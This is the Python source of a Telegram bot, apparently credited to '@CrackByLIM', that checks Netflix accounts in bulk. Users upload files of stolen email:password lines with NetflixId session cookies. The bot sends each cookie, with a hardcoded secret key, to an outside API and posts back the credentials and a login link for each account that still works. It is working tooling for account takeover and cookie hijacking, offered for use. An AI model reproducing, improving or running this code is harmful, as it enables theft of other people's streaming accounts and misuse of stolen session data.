import logging
import requests
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import Application, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypes
import os
from dotenv import load_dotenv
from pathlib import Path
import time
from collections import defaultdict
import asyncio
import re
import json

# Load environment variables
env_path = Path(__file__).parent / '.env'
load_dotenv(dotenv_path=env_path)

# ==================== YOUR API CONFIGURATION ====================
TOKEN = os.getenv('BOT_TOKEN')
API_URL = "http://genznfapi.onrender.com"  # YOUR API
SECRET_KEY = "KUROSAKI3DAY_d5Cl7U5mpXy2DL2ZrwS0Go47PCNYdjqB"  # YOUR SECRET KEY

# YOUR CREDIT
YOUR_CREDIT = "@CrackByLIM"

if not TOKEN:
    print("❌ ERROR: BOT_TOKEN not found!")
    exit(1)

# ==================== FIX FOR CONFLICT ERROR ====================
def clear_telegram_webhook():
    """Clear any existing webhook/sessions to prevent conflict"""
    try:
        webhook_url = f"https://api.telegram.org/bot{TOKEN}/deleteWebhook"
        response = requests.post(webhook_url)
        print(f"✅ Webhook cleared: {response.json()}")
        
        get_updates_url = f"https://api.telegram.org/bot{TOKEN}/getUpdates"
        requests.post(get_updates_url, json={"offset": -1, "timeout": 0})
        print("✅ Pending updates cleared")
        
        time.sleep(2)
    except Exception as e:
        print(f"⚠️ Warning while clearing webhook: {e}")

# Call this before starting the bot
clear_telegram_webhook()
# =============================================================

# Enable logging
logging.basicConfig(
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    level=logging.INFO
)
logger = logging.getLogger(__name__)

# User session storage
user_sessions = {}
rate_limits = defaultdict(list)

# Stats tracking
total_checks = 0
valid_accounts = 0
invalid_accounts = 0

# ==================== EXACT FORMAT PARSER ====================

def parse_account_line(line):
    """
    Parse a single line in the exact format:
    email:password | Phone: number | Country: name | Cookie: NetflixId=...
    """
    try:
        line = line.strip()
        if not line:
            return None
        
        account = {}
        
        # Split by | to get each field
        fields = line.split('|')
        
        # First field contains email:password
        first_field = fields[0].strip()
        if ':' in first_field:
            email_pass = first_field.split(':', 1)
            account['email'] = email_pass[0].strip()
            account['password'] = email_pass[1].strip()
        
        # Parse remaining fields
        for field in fields[1:]:
            field = field.strip()
            if ':' in field:
                key, value = field.split(':', 1)
                key = key.strip().lower()
                value = value.strip()
                
                if 'phone' in key:
                    account['phone'] = value
                elif 'country' in key:
                    account['country'] = value
                elif 'cookie' in key:
                    account['full_cookie'] = value
                    # Extract NetflixId from cookie
                    netflix_match = re.search(r'NetflixId=([^&\s]+)', value)
                    if netflix_match:
                        account['netflix_id'] = netflix_match.group(1).strip()
        
        # Validate we have the minimum required fields
        if 'netflix_id' not in account:
            logger.warning("❌ No NetflixId found in line")
            return None
        
        if 'email' not in account:
            account['email'] = f"user_{account['netflix_id'][:8]}@unknown.com"
        
        logger.info(f"✅ Parsed account: {account['email']}")
        return account
        
    except Exception as e:
        logger.error(f"Error parsing line: {e}")
        return None

# ==================== YOUR API FUNCTIONS ====================

async def check_with_your_api(netflix_id, email):
    """Check Netflix ID using YOUR API - with proper error handling"""
    
    if not netflix_id:
        return {
            "success": False,
            "error": "No Netflix ID provided",
            "error_code": "MISSING_ID",
            "email": email
        }
    
    try:
        # YOUR API endpoint - exactly as specified
        url = f"{API_URL}/api/gen"
        
        # Data payload exactly as your API expects
        data = {
            "netflix_id": netflix_id,
            "secret_key": SECRET_KEY
        }
        
        logger.info(f"📡 Calling YOUR API for {email}")
        logger.info(f"🔑 Netflix ID: {netflix_id[:30]}...")
        
        # Make the POST request as specified in your instructions
        response = requests.post(url, json=data, timeout=15)
        result = response.json()
        
        logger.info(f"📥 API Response: {result}")
        
        # Check if API call was successful according to YOUR API's format
        if result.get('success') == True:
            login_url = result.get('login_url')
            if login_url:
                logger.info(f"✅ VALID ACCOUNT: {email}")
                return {
                    "success": True,
                    "login_url": login_url,
                    "email": email,
                    "message": "Account is valid!"
                }
            else:
                return {
                    "success": False,
                    "error": "API returned success but no login URL",
                    "error_code": "MISSING_URL",
                    "email": email
                }
        else:
            # Handle error responses from YOUR API
            error_code = result.get('error_code', 'UNKNOWN_ERROR')
            error_msg = result.get('error', 'Unknown error')
            
            # Map error codes to user-friendly messages
            error_messages = {
                'INVALID_RESPONSE_FORMAT': "Netflix ID is invalid or expired",
                'INVALID_NETFLIX_ID': "Netflix ID is invalid or expired",
                'SERVER_ERROR': "Netflix server error - try again later",
                'MISSING_NETFLIX_ID': "No Netflix ID provided",
                'INVALID_SECRET_KEY': "API configuration error - contact admin",
                'AUTH_URL_EXTRACTION_FAILED': "Could not generate login link",
                'MAINTENANCE_MODE': "API is under maintenance - try again later"
            }
            
            user_message = error_messages.get(error_code, f"Error: {error_msg}")
            
            logger.warning(f"❌ INVALID ACCOUNT: {email} - {user_message}")
            
            return {
                "success": False,
                "error": user_message,
                "error_code": error_code,
                "raw_error": error_msg,
                "email": email
            }
                
    except requests.exceptions.Timeout:
        return {
            "success": False,
            "error": "API request timed out",
            "error_code": "TIMEOUT",
            "email": email
        }
    except requests.exceptions.ConnectionError:
        return {
            "success": False,
            "error": "Cannot connect to API server",
            "error_code": "CONNECTION_ERROR",
            "email": email
        }
    except Exception as e:
        return {
            "success": False,
            "error": str(e),
            "error_code": "UNKNOWN_ERROR",
            "email": email
        }

# ==================== TEST API COMMAND ====================

async def test_api_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Test if YOUR API is working with a sample request"""
    await update.message.reply_text("🔄 Testing YOUR API connection...")
    
    # Use a test Netflix ID (this will likely fail, but that's fine - we just want to see the API response)
    test_id = "test123"
    
    result = await check_with_your_api(test_id, "test@example.com")
    
    if result.get('success'):
        await update.message.reply_text(
            f"✅ **YOUR API IS WORKING!**\n\n"
            f"**API URL:** `{API_URL}`\n"
            f"**Status:** Online\n\n"
            f"**Response:** API returned a valid login link.",
            parse_mode='Markdown'
        )
    else:
        # Even if the test ID fails, the API might be working - we just want to see the response
        error = result.get('error', 'Unknown')
        error_code = result.get('error_code', 'UNKNOWN')
        
        await update.message.reply_text(
            f"📡 **YOUR API RESPONDED**\n\n"
            f"**API URL:** `{API_URL}`\n"
            f"**Status:** Online\n"
            f"**Response Code:** `{error_code}`\n"
            f"**Message:** `{error}`\n\n"
            f"✅ API is reachable! The test ID is intentionally invalid.",
            parse_mode='Markdown'
        )

# ==================== BOT COMMANDS ====================

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Start command"""
    user = update.effective_user
    
    welcome = f"""
╔════════════════════════════════════════╗
║     🎬 NETFLIX ACCOUNT CHECKER PRO 🎬  ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
👋 **Hello {user.first_name}!**

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📤 **Send me a .txt file** with accounts in this format:
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

`email:password | Phone: number | Country: name | Cookie: NetflixId=...`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📋 **Example:**
`user@gmail.com:pass123 | Phone: 123-456-7890 | Country: Philippines | Cookie: NetflixId=v%3D3%26ct%3D...`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📌 **Commands:**
/help - Instructions
/testapi - Test YOUR API
/stats - Statistics
/clear - Reset session

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    
    await update.message.reply_text(welcome, parse_mode='Markdown')

async def help_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Help command"""
    help_text = f"""
╔════════════════════════════════════════╗
║           🆘 HELP CENTER 🆘            ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📁 **HOW TO USE**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━

1️⃣ **Prepare your .txt file**
   • One account per line
   • Use | to separate fields
   • Must include Cookie: NetflixId=...

2️⃣ **Format:**
`email:password | Phone: number | Country: name | Cookie: NetflixId=...`

3️⃣ **Send the file to me**
   • I'll check each account with YOUR API
   • Valid accounts will be sent with login links
   • Invalid accounts will show the reason

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📝 **API Error Messages Explained:**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• `INVALID_RESPONSE_FORMAT` - Netflix ID is expired or invalid
• `SERVER_ERROR` - Netflix server issue, try again later
• `INVALID_NETFLIX_ID` - The Netflix ID doesn't work
• `TIMEOUT` - API request timed out
• `CONNECTION_ERROR` - Cannot reach API server

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⌨️ **COMMANDS:**
/start - Welcome
/testapi - Test YOUR API
/stats - Statistics
/clear - Clear session

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    await update.message.reply_text(help_text, parse_mode='Markdown')

async def stats_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Show statistics"""
    global total_checks, valid_accounts, invalid_accounts
    
    success_rate = valid_accounts/total_checks*100 if total_checks > 0 else 0
    
    stats_text = f"""
╔════════════════════════════════════════╗
║         📊 GLOBAL STATISTICS 📊        ║
╚════════════════════════════════════════╝

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
📈 **Performance:**
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
• **Total Checks:** `{total_checks}`
• **✅ Valid:** `{valid_accounts}`
• **❌ Invalid:** `{invalid_accounts}`
• **📊 Success Rate:** `{success_rate:.1f}%`

━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
⚡ **Powered by {YOUR_CREDIT}** ⚡
━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━
    """
    
    await update.message.reply_text(stats_text, parse_mode='Markdown')

async def clear_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Clear user session"""
    user_id = update.effective_user.id
    if user_id in user_sessions:
        del user_sessions[user_id]
    await update.message.reply_text("✅ Session cleared. You can upload a new file.")

# ==================== FILE HANDLER ====================

async def handle_file(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle uploaded .txt files"""
    user_id = update.effective_user.id
    global total_checks, valid_accounts, invalid_accounts
    
    if not check_rate_limit(user_id):
        await update.message.reply_text("⏰ Too many requests. Please wait a minute.")
        return
    
    document = update.message.document
    
    if not document.file_name.endswith('.txt'):
        await update.message.reply_text("❌ Please upload a `.txt` file.")
        return
    
    status_msg = await update.message.reply_text("📥 Downloading file...")
    
    try:
        file = await context.bot.get_file(document.file_id)
        file_content = await file.download_as_bytearray()
        content = file_content.decode('utf-8', errors='ignore')
        
        # Split into lines (each line is one account)
        lines = content.split('\n')
        accounts = [line.strip() for line in lines if line.strip()]
        
        await status_msg.edit_text(f"📊 Found {len(accounts)} accounts. Checking with YOUR API...")
        
        valid_count = 0
        invalid_count = 0
        error_counts = defaultdict(int)
        
        for i, line in enumerate(accounts, 1):
            # Parse the line in your exact format
            account = parse_account_line(line)
            
            if not account:
                invalid_count += 1
                error_counts['PARSING_FAILED'] += 1
                logger.warning(f"❌ Failed to parse line {i}")
                continue
            
            # Update progress
            if i % 2 == 0 or i == len(accounts):
                await status_msg.edit_text(
                    f"🔄 Checking {i}/{len(accounts)}...\n"
                    f"✅ Valid: {valid_count} | ❌ Invalid: {invalid_count}"
                )
            
            # Check with YOUR API
            result = await check_with_your_api(account['netflix_id'], account['email'])
            
            total_checks += 1
            
            if result.get('success'):
                valid_count += 1
                valid_accounts += 1
                
                # Build account details string
                details = []
                if account.get('country'):
                    details.append(f"• **Country:** {account['country']}")
                if account.get('phone'):
                    details.append(f"• **Phone:** {account['phone']}")
                
                details_str = '\n'.join(details) if details else ''
                
                msg = f"""
✅ **VALID ACCOUNT FOUND!**

📧 **Email:** `{account['email']}`
🔑 **Password:** `{account.get('password', 'N/A')}`
{details_str}

🔗 **Login Link:** `{result['login_url']}`

⚡ {YOUR_CREDIT}
                """
                
                keyboard = [[InlineKeyboardButton("🎬 LAUNCH NETFLIX", url=result['login_url'])]]
                await update.message.reply_text(msg, reply_markup=InlineKeyboardMarkup(keyboard))
                
            else:
                invalid_count += 1
                invalid_accounts += 1
                error_code = result.get('error_code', 'UNKNOWN')
                error_counts[error_code] += 1
                
                # Log the error for debugging
                logger.info(f"❌ Account {i}: {account['email']} - {result.get('error')}")
            
            await asyncio.sleep(0.5)
        
        # Final summary with error breakdown
        summary = f"""
📊 **CHECK COMPLETE!**

✅ **Valid Accounts:** {valid_count}
❌ **Invalid Accounts:** {invalid_count}

**Error Breakdown:**
"""
        
        for error, count in error_counts.items():
            summary += f"• `{error}`: {count}\n"
        
        if valid_count == 0:
            summary += "\n💡 **Note:** 'INVALID_RESPONSE_FORMAT' usually means the Netflix ID is expired."
        
        await status_msg.edit_text(summary)
        
    except Exception as e:
        logger.error(f"Error: {e}")
        await status_msg.edit_text(f"❌ Error: {str(e)[:100]}")

# ==================== RATE LIMITING ====================

def check_rate_limit(user_id, limit=5, period=60):
    now = time.time()
    rate_limits[user_id] = [t for t in rate_limits[user_id] if now - t < period]
    if len(rate_limits[user_id]) >= limit:
        return False
    rate_limits[user_id].append(now)
    return True

# ==================== BUTTON CALLBACK ====================

async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Handle button callbacks"""
    query = update.callback_query
    await query.answer()

# ==================== MAIN FUNCTION ====================

async def run_bot():
    """Run the bot"""
    print("=" * 60)
    print("🎬 NETFLIX ACCOUNT CHECKER BOT")
    print("=" * 60)
    print(f"✅ Bot Token: {TOKEN[:10]}...")
    print(f"✅ YOUR API: {API_URL}")
    print(f"✅ Credit: {YOUR_CREDIT}")
    print("=" * 60)
    print("🤖 Bot is starting...")
    print("📝 Using YOUR API exactly as specified")
    print("=" * 60)
    
    app = Application.builder().token(TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("help", help_command))
    app.add_handler(CommandHandler("stats", stats_command))
    app.add_handler(CommandHandler("clear", clear_command))
    app.add_handler(CommandHandler("testapi", test_api_command))
    app.add_handler(CallbackQueryHandler(button_callback))
    app.add_handler(MessageHandler(filters.Document.FileExtension("txt"), handle_file))
    
    await app.initialize()
    await app.start()
    await app.updater.start_polling(drop_pending_updates=True)
    
    print("✅ Bot is running! Send a .txt file to test.")
    print("=" * 60)
    
    try:
        while True:
            await asyncio.sleep(1)
    except KeyboardInterrupt:
        print("\n👋 Bot stopped by user")
    finally:
        await app.updater.stop()
        await app.stop()
        await app.shutdown()

def main():
    """Main entry point"""
    try:
        asyncio.run(run_bot())
    except KeyboardInterrupt:
        print("\n👋 Bot stopped by user")
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == '__main__':
    main()


